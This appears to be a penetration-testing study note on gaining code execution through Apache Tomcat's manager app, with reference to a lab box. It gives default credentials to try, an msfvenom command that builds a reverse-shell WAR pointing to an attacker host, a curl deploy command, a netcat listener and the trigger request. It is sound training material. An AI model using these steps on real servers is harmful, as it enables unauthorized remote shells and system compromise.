---
type: technique
tags: [ejpt:web-pentest]
tools: [metasploit, curl]
cves: []
related: ["[[web-shell-upload]]", "[[hardcoded-credentials]]", "[[hiddencat]]", "[[jenkins-script-console-rce]]"]
---

# Tomcat Manager WAR Deploy

Apache Tomcat ships a **manager** app (`/manager/`) whose whole purpose is deployment: an authenticated user holding the `manager-gui`/`manager-script` role can upload a **WAR** (Web Application aRchive), and Tomcat unpacks it, mounts it under a context path, and serves its JSPs. That is *intended functionality* — no CVE, no memory corruption, no patch. The attack surface is therefore **authentication**, exactly like [[jenkins-script-console-rce]]: the feature is the payload, and the whole game is reaching it with credentials.

The credentials part is why this primitive is legendary: Tomcat's default install has historically shipped `tomcat:s3cret` in `tomcat-users.xml`, and that pair is tried on *every* Tomcat box in the wild.

## Recognition

- Port **8080** banner: `Apache Tomcat/9.x` ([[nmap]], [[whatweb]]).
- `gobuster dir` → `manager` answering **302** to `/manager/` (Tomcat's slash-normalization for its default apps, alongside `docs/` and `examples/`). A 302 here is the app saying *"I exist, come in properly"* — follow it; `/manager/html` is the login door ([[directory-fuzzing]]).
- Credentials come from wherever recon puts them: the default pair `tomcat:s3cret` itself, a leak, a note. On [[pn]] an **unauthenticated** `curl -s http://TARGET:8080/manager/html | grep 'username'` returned the user-table line — `tomcat:s3cret`, `manager-gui` included — with the mechanism never explained (recorded as a gap) ([[hardcoded-credentials]]).

## Workflow

1. **Get manager credentials** — default pair first (`tomcat:s3cret`, `tomcat:tomcat`, `admin:admin`), then whatever recon produced ([[hardcoded-credentials]]). Log in at `/manager/html`.
2. **Build a payload WAR** — a WAR is just a zip containing a Java webapp, and a JSP inside it executes server-side:

   ```sh
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war > reverse.war
   ```

   **LHOST must be *your* IP.** The first build on [[pn]] pointed at the box itself (`LHOST=172.17.0.2`) and had to be rebuilt with the attacker's (`172.17.0.1`) — a payload that dials itself never calls back ([[metasploit]]).
3. **Recover the JSP name.** msfvenom **randomizes** the JSP filename per build, and you cannot request what you cannot name:

   ```sh
   unzip reverse.war        # WEB-INF/web.xml + <random>.jsp
   strings reverse.war | grep jsp
   ```

   Browsing the context path after deploy can also reveal it, but `unzip` answers before you upload ([[pn]] used `unzip`; its dead first build used `strings`).
4. **Deploy** through the manager — the UI's "WAR file to deploy" section, or over HTTP with the manager text API:

   ```sh
   curl -u tomcat:s3cret --upload-file reverse.war \
     'http://TARGET:8080/manager/text/deploy?path=/reverse'
   ```

   (The deploy action itself was never recorded on [[pn]] — msfvenom → unzip → curl is the whole transcript.)
5. **Trigger** — context path = the WAR's basename minus `.war` (`reverse.war` → `/reverse/`), listener up first:

   ```sh
   sudo nc -lvnp 443
   curl http://TARGET:8080/reverse/<random>.jsp
   ```

   The JSP connects back; you are in ([[reverse-shells]]).

## Why no CVE is involved

- **Intended functionality + bad/leaked credentials.** Nothing is exploited: the product offers code execution on deployment by design. The vulnerability, if you must name one, is *operational* — default credentials and/or a manager exposed beyond localhost.
- **Same shape as [[jenkins-script-console-rce]]** — an admin feature whose risk is entirely "who can authenticate". Any product-feature-RCE page (Jenkins Script Console, Node inspector, this) belongs to that family: recon's job is the *login*, not the exploit.
- **Two doors, one product.** [[hiddencat]] met the same product family and took the CVE route (CVE-2020-1938 AJP file read), leaving `manager/` unopened; [[pn]] opened `manager/` and never needed a CVE. When a banner says Tomcat, hold **both** doors in mind: the odd protocol (8009/ajp13) *and* the default webapp behind a 302.

## Gotchas

- **JSP name randomness is per-build** — regenerate the WAR and the name changes; re-`unzip` instead of reusing an old name.
- **Context path = WAR basename.** Deploy `rev.war` and the shell lives at `/rev/…`, not at the payload's internal path.
- **You land as the Tomcat service user** — `www-data`/`tomcat` on a sane install, whatever runs the JVM. On [[pn]] it was **root**: `whoami` on the first shell returned root with no privilege-escalation stage, which means the *service itself* was the misconfiguration. Verify with `id`/`ps` before believing a one-word `whoami` ([[pn]] never did).
- Low callback ports (< 1024, e.g. `LPORT=443`) need a `sudo`'d listener on the attacker side ([[netcat]]).
- Manager access may be gated by a `RemoteAddrValve` to localhost on hardened installs — if the manager answers 404/403 from your IP, the door is config-sealed, not absent.

## Seen in

[[pn]]
